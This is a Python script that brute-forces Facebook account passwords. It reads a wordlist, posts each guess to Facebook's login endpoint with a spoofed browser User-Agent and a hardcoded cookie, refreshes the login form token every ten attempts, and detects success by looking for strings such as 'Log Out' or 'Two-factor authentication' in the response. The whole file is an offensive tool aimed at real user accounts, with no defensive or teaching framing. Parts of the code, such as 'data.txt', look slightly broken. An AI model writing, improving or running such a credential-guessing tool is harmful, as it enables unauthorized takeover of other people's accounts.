import requests
from bs4 import BeautifulSoup
import sys

import coloredlogs, logging


logger = logging.getLogger(__name__)
coloredlogs.install(fmt='%(message)s',level='DEBUG', logger=logger)

MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'
}
PAYLOAD = {}
COOKIES = {}
TARGET_PROFILE = ''

def create_form():
    form = dict()
    cookies = {"fr"	:"0BCO8HvH9PIHrzkoG.AWWmiPbIHFsTpjS_hzqwEBXmIj4.BhqI8W.DH.AAA.0.0.BhqJee.AWWNye_XPRM"}
    
    data = requests.get(POST_URL , headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.txt,'html.parser').form
    print(data.prettify())
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form,cookies

def is_this_the_password(email,index,password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    print(r.text)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text :
        open('temp', 'w').write(str(r.content))
        print('\npassword found is ',password)
        return True
    print('Wrong Password :( \n')
    return False


def brute_force_fb(email,passwords_file):
    index = 0
    with open(passwords_file) as passwords:
        for password in passwords:
            index += 1
            password = password.strip()
            if len(password) <MIN_PASSWORD_LENGTH:
                continue
            print("Trying password [", index,"]: ",password)
            if is_this_the_password(email, index,password):
                break
